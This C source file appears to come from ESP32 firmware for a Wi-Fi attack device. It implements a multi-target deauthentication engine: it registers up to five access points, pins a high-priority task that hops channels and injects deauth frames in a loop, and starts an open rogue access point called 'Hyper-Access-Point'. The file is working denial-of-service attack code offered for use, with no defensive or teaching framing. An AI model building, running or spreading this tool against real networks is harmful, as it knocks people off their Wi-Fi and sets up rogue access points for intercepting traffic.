/**
 * @file attack_dos.c
 * @author TaxCoding (raja.naufal1605@student.unri.ac.id)
 * @date 2026
 * @copyright Copyright (c) 2026
 * 
 * @brief Multi-target Wi-Fi deauth engine optimized with Core 1 pinning and mode limiting.
 */

#include "attack_dos.h"
#include "wsl_bypasser.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "rom/ets_sys.h"
#include <string.h>

static const char *TAG = "attack_dos_hyper";
static TaskHandle_t multi_attack_task_handle = NULL;
static volatile bool attack_running = false;

#define MAX_TARGETS 5
static wifi_ap_record_t targets[MAX_TARGETS];
static int target_count = 0;
static int active_target_limit = 5; // Batas default sesuai mode

/**
 * @brief High-priority background task pinned to Core 1 for round-robin raw frame injection.
 */
static void hyper_attack_task(void *pvParameters) {
    int current_index = 0;
    ESP_LOGI(TAG, "Hyper-Attack Task running on Core %d with limit %d targets.", xPortGetCoreID(), active_target_limit);

    while (attack_running) {
        if (target_count == 0) {
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }

        // Tentukan jumlah target efektif berdasarkan mode yang aktif
        int effective_count = (target_count < active_target_limit) ? target_count : active_target_limit;
        if (effective_count <= 0) effective_count = 1;

        if (current_index >= effective_count) {
            current_index = 0;
        }

        wifi_ap_record_t *current_target = &targets[current_index];

        esp_wifi_set_channel(current_target->primary, WIFI_SECOND_CHAN_NONE);

        for (int i = 0; i < 5; i++) {
            if (!attack_running) break;
            wsl_bypasser_send_deauth_frame(current_target);
            ets_delay_us(2000);
        }

        current_index = (current_index + 1) % effective_count;

        ets_delay_us(10000);
    }

    multi_attack_task_handle = NULL;
    vTaskDelete(NULL);
}

/**
 * @brief Initialize the attack module.
 */
void attack_dos_init(void) {
    // Inisialisasi awal stack wifi sekali saja di sini jika diperlukan
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    ESP_LOGI(TAG, "Attack DOS module initialized.");
}

/**
 * @brief Register a target AP into the multi-target tracking array.
 */
void attack_dos_add_target(const wifi_ap_record_t *record) {
    if (target_count < MAX_TARGETS) {
        memcpy(&targets[target_count], record, sizeof(wifi_ap_record_t));
        target_count++;
        ESP_LOGI(TAG, "Target registered [%d]: %s (Ch: %d)", target_count - 1, record->ssid, record->primary);
    }
}

/**
 * @brief Set the maximum number of targets to attack based on the current mode.
 */
void attack_dos_set_mode_limit(int limit) {
    active_target_limit = (limit > MAX_TARGETS) ? MAX_TARGETS : (limit < 1 ? 1 : limit);
    ESP_LOGI(TAG, "Attack target limit updated to: %d", active_target_limit);
}

/**
 * @brief Initialize the Rogue AP interface and launch the hyper-attack task on Core 1.
 */
void attack_dos_start_multi(void) {
    if (attack_running) return;

    if (target_count > 0) {
        wifi_config_t wifi_config = {
            .ap = {
                .max_connection = 4,
                .authmode = WIFI_AUTH_OPEN,
                .channel = targets[0].primary
            },
        };
        strncpy((char *)wifi_config.ap.ssid, "Hyper-Access-Point", sizeof(wifi_config.ap.ssid));
        wifi_config.ap.ssid_len = strlen("Hyper-Access-Point");

        esp_wifi_set_mode(WIFI_MODE_AP);
        esp_wifi_set_config(WIFI_IF_AP, &wifi_config);
        esp_wifi_start();

        ESP_LOGI(TAG, "Rogue AP interface beaconing.");
    }

    attack_running = true;

    xTaskCreatePinnedToCore(
        &hyper_attack_task,
        "hyper_attack",
        4096,
        NULL,
        configMAX_PRIORITIES - 1,
        &multi_attack_task_handle,
        1
    );

    ESP_LOGI(TAG, "Hyper-Attack Engine active and stabilized on Core 1!");
}

/**
 * @brief Halt the attack execution and stop the Wi-Fi driver.
 */
void attack_dos_stop(void) {
    if (!attack_running) return;
    
    attack_running = false;
    
    // Beri waktu sebentar agar task keluar dari loop dengan bersih
    vTaskDelay(pdMS_TO_TICKS(50));
    
    esp_wifi_stop();
    ESP_LOGI(TAG, "Attack execution halted.");
}